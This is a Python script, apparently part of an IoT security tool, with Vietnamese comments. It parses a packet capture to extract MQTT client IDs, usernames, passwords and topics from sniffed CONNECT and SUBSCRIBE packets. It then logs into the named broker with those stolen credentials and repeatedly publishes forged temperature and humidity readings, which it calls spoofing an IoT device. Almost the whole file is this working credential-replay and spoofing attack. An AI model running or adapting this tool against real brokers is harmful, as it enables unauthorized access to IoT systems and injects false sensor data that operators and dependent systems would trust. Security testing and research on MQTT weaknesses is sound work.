import sys
from scapy.all import *
import re
import paho.mqtt.client as mqtt
import json
import time

# Thiết lập cấu hình để sử dụng Npcap
conf.use_pcap = True
conf.use_npcap = True

def All(packets, ipserver, port,timeReal):
    try:
        def filter_mqtt(pkt):
            if pkt.haslayer(Raw):
                raw_data = pkt[Raw].load
                return raw_data
            return False

        def extract_alphanumeric(input_string):
            alphanumeric_only = re.sub(r'[^a-zA-Z0-9]', '', input_string)
            return alphanumeric_only

        temp_info = {}
        temp_info1 = {}

        def decode_mqtt_raw(pkt):
            if pkt.haslayer(Raw):
                raw_data = pkt[Raw].load
                print("Raw data:", raw_data)
                try:
                    if raw_data.startswith(b'\x10'):
                        payload = raw_data[12:]
                        payload_ascii = payload.decode('utf-8')
                        values = payload_ascii.split('\x00')
                        if len(values) > 3:
                            Client_Id = extract_alphanumeric(values[1])
                            Username = extract_alphanumeric(values[2])
                            Password = extract_alphanumeric(values[3])
                            temp_info['Username'] = Username
                            temp_info['Password'] = Password
                            temp_info['Client_Id'] = Client_Id
                            print("Listening, Username, Password:", Client_Id, Username, Password)
                            sys.stdout.flush()
                        else:
                            print("...............................")
                            sys.stdout.flush()
                    if raw_data.startswith(b'\x82'):
                        raw_data_new = raw_data[:-1]
                        payload = raw_data_new[6:]
                        payload_ascii = payload.decode('utf-8')
                        Topic = payload_ascii
                        print("Listening Topic:", Topic)
                        sys.stdout.flush()
                        temp_info1['Topic'] = Topic
                except UnicodeDecodeError:
                    print("Error decoding raw data")
                    sys.stdout.flush()

        def stop_sniffing(pkt):
            return 'Username' in temp_info and 'Password' in temp_info and 'Client_Id' in temp_info and 'Topic' in temp_info1

        # Đọc các gói tin từ file pcap
        for pkt in packets:
            if filter_mqtt(pkt):
                decode_mqtt_raw(pkt)
                if stop_sniffing(pkt):
                    break

        def spoofingIOT(Client_Id, Username, Password, Topic):
            client = mqtt.Client(Client_Id)
            def on_connect(client, userdata, flags, rc):
                print(789)
                if rc == 0:
                    # client.subscribe(Topic)  # Đăng ký vào chủ đề khi kết nối thành công
                    print(f"Connected to MQTT broker. Subscribed to topic: {Topic}")
                else:
                    print("Connection failed")
                    sys.stdout.flush()

            def on_message(client, userdata, message):
                print("Spoofing Received message:", message.payload.decode())
                sys.stdout.flush()

            client.on_connect = on_connect
            client.on_message = on_message
            client.username_pw_set(Username, Password)  # Thiết lập thông tin đăng nhập
            client.connect(ipserver, port)  # Kết nối tới broker MQTT
            # Gửi thông điệp JSON liên tục
            client.loop_start()
            start_time = time.time()
            i = 1
            while time.time() - start_time <timeReal:
                json_data = {
                    "temperature": 25.5 + i,
                    "humidity": 60 + i
                }
                json_message = json.dumps(json_data)
                client.publish(Topic, json_message)
                print(f"Published message: {json_message}")
                i += 1
                time.sleep(5)  # Gửi thông điệp mỗi 5 giây
              # Thay vì loop_forever, sử dụng loop_start để chạy client MQTT song song
            client.loop_stop()  # Dừng vòng lặp MQTT
            client.disconnect()  # Ngắt kết nối khỏi broker

        if temp_info1.get('Topic') and temp_info.get('Username') and temp_info.get('Password') and temp_info.get('Client_Id'):
            print(123)
            spoofingIOT(temp_info['Client_Id'], temp_info['Username'], temp_info['Password'], temp_info1['Topic'])
        else:
            print("No spoofing!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    except Exception as e:
        print(f"Error Input: {e}")
        sys.stdout.flush()
def process_json_input(json_string):
    try:
        # Phân tích chuỗi JSON thành một đối tượng Python
        data = json.loads(json_string)
        # Trả về đối tượng đã được phân tích
        return data
    except json.JSONDecodeError as e:
        # Xử lý trường hợp nếu chuỗi JSON không hợp lệ
        print("Invalid JSON format:", e)
        sys.stdout.flush()
        return None
def process_pcap_data(hex_data):
    # Chuyển đổi chuỗi hex thành dữ liệu nhị phân
    file_data = bytes.fromhex(hex_data)
    
    # Lưu dữ liệu nhị phân vào một tệp tạm thời
    with open("temp.pcap", "wb") as f:
        f.write(file_data)

    # Đọc các gói tin từ tệp pcap
    packets = rdpcap("temp.pcap")
    return packets
if __name__ == "__main__":
    data1 = sys.stdin.readline()
    data = process_json_input(data1)
    print("Loading spoofing device IOT ....................")
    print(data)
    sys.stdout.flush()
    if data and 'content' in data:
        dataReal = process_pcap_data(data['content'])
        All(dataReal, data['ipserver'], int(data['port']),int(data['time']))
    else:
        print("No valid data received")